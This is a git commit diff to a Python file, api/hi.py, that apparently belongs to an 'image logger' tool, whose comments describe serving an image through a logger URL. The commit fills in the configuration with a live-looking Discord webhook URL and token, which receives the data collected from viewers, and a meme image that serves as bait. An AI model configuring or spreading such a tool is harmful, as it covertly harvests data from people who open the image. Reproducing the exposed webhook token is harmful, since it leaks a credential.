4ea12da495851f8d4429ccc35afd0b60823afacb
PcManNo <113313592+PcManNo@users.noreply.github.com>
2025-12-02 00:17:44 +0300

    Update hi.py

--- api/hi.py
+++ api/hi.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445157138446942292/AWbjtqadLxOICjVzQV7xDOk2Vv1wduNxAMiiTAIxkTAX5jJF5YlX3JoswK61A8Wigcge",
+    "image": "https://www.pngmart.com/files/22/Emoji-Meme-PNG-Photos.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
